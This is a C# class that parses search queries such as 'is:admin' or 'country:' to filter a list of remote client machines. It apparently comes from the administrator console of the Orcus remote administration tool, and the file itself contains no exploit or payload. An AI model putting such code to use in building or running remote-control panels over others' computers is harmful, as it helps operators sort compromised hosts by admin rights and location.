using System;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using Orcus.Administration.Core.ClientManagement;

namespace Orcus.Administration.Controls.Clients
{
    public class FilterParser
    {
        public string SearchText { get; set; }
        public bool? IsOnline { get; set; }
        public string OsName { get; set; }
        public bool? IsAdministrator { get; set; }
        public string Username { get; set; }
        public int? ClientId { get; set; }
        public bool? Compatible { get; set; }
        public string Language { get; set; }
        public string Group { get; set; }
        public string Country { get; set; }

        public bool IsAccepted(ClientViewModel clientViewModel)
        {
            if (ClientId != null)
                return clientViewModel.Id == ClientId.Value;

            if (IsOnline != null && clientViewModel.IsOnline != IsOnline.Value)
                return false;

            if (IsAdministrator != null && clientViewModel.IsAdministrator != IsAdministrator.Value)
                return false;

            if (OsName != null && clientViewModel.OsName.IndexOf(OsName, StringComparison.OrdinalIgnoreCase) == -1)
                return false;

            if (Username != null && clientViewModel.UserName.IndexOf(Username, StringComparison.OrdinalIgnoreCase) == -1)
                return false;

            if (Compatible != null && clientViewModel.ApiVersion == App.ClientApiVersion != Compatible.Value)
                return false;

            if (Group != null && clientViewModel.Group.IndexOf(Group, StringComparison.OrdinalIgnoreCase) == -1)
                return false;

            if (Language != null)
            {
                var languageElements = clientViewModel.Language.Split('-');
                if (!Language.StartsWith(languageElements[0], StringComparison.OrdinalIgnoreCase) &&
                    !(languageElements.Length > 1 &&
                      Language.StartsWith(languageElements[1], StringComparison.OrdinalIgnoreCase)) &&
                    clientViewModel.LanguageName.IndexOf(Language, StringComparison.OrdinalIgnoreCase) == -1)
                    return false;
            }

            if (Country != null)
            {
                if (!string.Equals(clientViewModel.GeoLocationTwoLetter, Country, StringComparison.OrdinalIgnoreCase) &&
                    !clientViewModel.GeoLocationCountry.StartsWith(Country, StringComparison.OrdinalIgnoreCase))
                    return false;
            }

            if (!string.IsNullOrEmpty(SearchText))
            {
                if (clientViewModel.UserName.IndexOf(SearchText, StringComparison.OrdinalIgnoreCase) == -1 &&
                    clientViewModel.Id.ToString() != SearchText &&
                    clientViewModel.OsName.IndexOf(SearchText, StringComparison.OrdinalIgnoreCase) == -1)
                    return false;
            }

            return true;
        }

        public static FilterParser ParseString(string s)
        {
            var searchText = new StringBuilder();
            var parts = s.Split('"')
                .Select((element, index) => index%2 == 0 // If even index
                    ? element.Split(new[] {' '}, StringSplitOptions.RemoveEmptyEntries) // Split the item
                    : new[] {element}) // Keep the entire item
                .SelectMany(element => element).ToList();

            var result = new FilterParser();

            foreach (var part in parts)
            {
                var trueCondition = part.StartsWith("is:", StringComparison.OrdinalIgnoreCase);
                var falseCondition = part.StartsWith("isnot:", StringComparison.OrdinalIgnoreCase);

                if (trueCondition || falseCondition)
                {
                    switch (part.Substring(trueCondition ? 3 : 6, part.Length - (trueCondition ? 3 : 6)).ToLower())
                    {
                        case "online":
                            result.IsOnline = trueCondition;
                            break;
                        case "administrator":
                        case "admin":
                            result.IsAdministrator = trueCondition;
                            break;
                        case "compatible":
                            result.Compatible = trueCondition;
                            break;
                    }
                    continue;
                }

                if (Regex.IsMatch(part, "^CI-[0-9]{1,6}$", RegexOptions.IgnoreCase))
                {
                    result.ClientId = int.Parse(part.Substring(3));
                    continue;
                }

                if (part.Contains(":"))
                {
                    var split = part.Split(new[] {':'}, 2);
                    switch (split[0].ToLower())
                    {
                        case "username":
                        case "name":
                        case "user":
                            result.Username = split[1];
                            continue;
                        case "osname":
                        case "os":
                        case "operatingsystem":
                            result.OsName = split[1];
                            continue;
                        case "language":
                        case "lang":
                            result.Language = split[1];
                            continue;
                        case "clientid":
                            int clientId;
                            if (int.TryParse(split[1], out clientId))
                                result.ClientId = clientId;
                            continue;
                        case "group":
                            result.Group = split[1];
                            continue;
                        case "country":
                        case "location":
                            result.Country = split[1];
                            continue;
                    }
                }

                if (searchText.Length != 0)
                    searchText.Append(" ");

                searchText.Append(part);
            }

            result.SearchText = searchText.ToString();
            return result;
        }
    }
}